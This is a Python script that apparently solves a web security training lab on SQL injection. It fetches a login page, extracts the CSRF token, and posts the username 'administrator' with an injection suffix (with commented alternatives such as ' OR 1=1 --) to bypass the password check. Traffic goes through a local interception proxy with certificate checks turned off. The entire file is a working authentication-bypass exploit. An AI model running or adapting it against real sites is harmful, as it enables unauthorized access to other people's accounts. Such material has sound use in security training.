#!/usr/bin/env python3
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
from requests.exceptions import RequestException

LOGIN_ENDPOINT = "login"
REQUEST_TIMEOUT = (2, 5)
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

warnings.filterwarnings("ignore", message="Unverified HTTPS request")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

    def send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[requests.Response]:
        """Helper to handle all HTTP communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method=method,
                url=target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except RequestException:
            print("[-] Connection error: {e}")
            return None

    def extract_csrf_token(self, html_content: str) -> Optional[str]:
        soup = BeautifulSoup(html_content, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        if csrf_tag:
            value = csrf_tag.get("value")
            return str(value)
        return None

    def solve(self) -> None:
        # Step 1: Load login page and extract the CSRF token
        res = self.send_request("login")
        if res is None or res.status_code != 200:
            print("[-] Unable to load login page!")
            return

        csrf_token = self.extract_csrf_token(res.text)
        if not csrf_token:
            print("[-] Could not find CSRF Token in login page!")
            return
        print(f"[+] Extracted CSRF Token: {csrf_token}")

        # Step 2: Perform Injection in username
        # sqli_payload = "'-- "
        # sqli_payload = "' OR 1=1 -- "
        sqli_payload = "' AND 1=1 -- "
        login_data = {
            "csrf": csrf_token,
            "username": f"administrator{sqli_payload}",
            "password": "abc",
        }

        res = self.send_request("login", data=login_data, method="POST")
        if res is None or res.status_code != 200:
            print("[-] Login POST request failed!")
            return

        # Step 3: Check final state
        res = self.send_request("")
        if res is not None and "Congratulation" in res.text:
            print("[!] SUCCESS: Logged in and lab solved")
        else:
            print("[-] SQL injection failed!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
